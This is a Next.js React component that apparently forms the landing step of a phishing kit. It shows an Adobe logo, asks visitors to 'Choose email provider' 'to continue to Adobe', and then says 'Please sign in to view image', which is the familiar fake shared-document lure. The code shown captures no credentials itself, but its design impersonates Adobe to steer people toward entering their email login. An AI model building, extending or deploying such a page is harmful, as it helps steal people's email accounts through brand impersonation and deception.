"use client";

import { useState } from "react";
import Image from "next/image";
import { usePathname, useRouter } from "next/navigation";
import { theme } from "@/components/theme";

export default function Connect({ initialBox }: { initialBox?: string }) {
  const startOption = theme.find((option) => option.text === initialBox) ?? theme[0];
  const [selectedImage, setSelectedImage] = useState(startOption.image);
  const router = useRouter();
  const pathname = usePathname();

  const handleSelect = (option: (typeof theme)[number]) => {
    setSelectedImage(option.image);
    router.replace(`${pathname}?box=${encodeURIComponent(option.text)}`, {
      scroll: false,
    });
  };

  return (
    <>
      <div className=" mx-auto mb-6  w-full max-w-sm px-4">
        <Image width={80} height={80} src="/adobe.png" alt="logo" />

        <h1 className="text-left text-2xl font-semibold text-zinc-800 dark:text-zinc-50">
          Choose email provider
        </h1>
        <p> to continue to <span className="text-red-700 font-bold">Adobe</span> </p>
      </div>

      <div className="mx-auto mb-10 grid w-full max-w-sm grid-cols-1 gap-3 px-4">
        {theme.map((option, i) => (
          <button
            key={i}
            type="button"
            onClick={() => handleSelect(option)}
            className="flex items-center justify-left gap-2 rounded-full border border-zinc-300 bg-transparent px-4 py-2 text-sm font-medium text-zinc-800 transition hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-100 dark:hover:bg-zinc-800"
          >
            <Image width={15} height={15} src={option.image} alt="image"/>
            {option.text}
          </button>
          
        ))}
      </div>
    
      <Image className="mx-auto" src={selectedImage} alt="none" width={60} height={60} />
      <p className="mx-auto text-xl font-black">Please sign in to view image</p>

    </>
  );
}
